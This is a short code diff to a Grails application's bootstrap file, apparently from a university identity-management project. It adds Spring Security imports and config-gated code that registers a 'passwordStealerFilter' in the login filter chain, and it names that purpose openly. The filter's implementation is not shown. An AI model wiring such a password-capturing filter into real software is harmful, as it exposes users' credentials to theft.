@@ -1,4 +1,6 @@
 import edu.umn.idm.*
+import org.codehaus.groovy.grails.plugins.springsecurity.SpringSecurityUtils
+import org.codehaus.groovy.grails.plugins.springsecurity.SecurityFilterPosition
 
 class BootStrap {
 
@@ -14,6 +16,16 @@ class BootStrap {
 		assert User.count() == 1
 		assert Role.count() == 2
 		assert UserRole.count() == 1
+
+		def conf = SpringSecurityUtils.securityConfig
+
+		if (conf.active && conf.passwordStealer.active) {
+			println "Loading the password stealing filter..."
+			// loads the password stealing filter
+			SpringSecurityUtils.clientRegisterFilter 'passwordStealerFilter', 
+				SecurityFilterPosition.LOGOUT_FILTER.getOrder() + 1
+			println "... finshed loading the password stealing filter"
+		}
     }
     def destroy = {
     }
